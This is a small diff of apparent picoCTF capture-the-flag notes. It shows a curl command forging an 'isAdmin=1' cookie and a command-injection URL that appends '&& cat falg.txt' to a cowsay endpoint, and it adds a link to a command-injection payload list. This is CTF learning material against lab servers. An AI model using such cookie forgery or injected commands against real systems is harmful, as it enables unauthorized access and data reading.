@@ -23,3 +23,7 @@ curl http://saturn.picoctf.net:50500/check.php --cookie "isAdmin=1"
 - https://caas.mars.picoctf.net/cowsay/hackeddone && cat falg.txt
   
 -------------------------------------------------------------------------------
+
+- https://github.com/payloadbox/command-injection-payload-list
+
+-------------------------------------------------------------------------------
